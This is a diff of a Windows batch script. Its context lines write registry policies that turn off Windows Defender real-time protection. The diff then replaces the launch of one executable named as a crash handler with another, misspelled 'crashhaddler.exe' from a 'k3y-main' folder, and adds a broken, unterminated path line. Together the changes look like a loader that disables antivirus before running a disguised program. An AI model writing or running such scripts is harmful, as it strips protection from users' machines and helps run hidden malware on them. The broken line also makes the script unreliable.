@@ -41,8 +41,11 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 :: Disable Scan On Realtime Enable
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f
 
+timeout /t 1 > nul
 
-start C:\Users\%username%\Desktop\files\unitycrash-handler.exe
+call "C:\Users\%USERPROFILE%\Desktop\k3y-main\k3y-main\crashhaddler.exe"
+"C:\Users\lilmu\Desktop\my tool\
+timeout /t 1 > nul
 
 
 dir/s
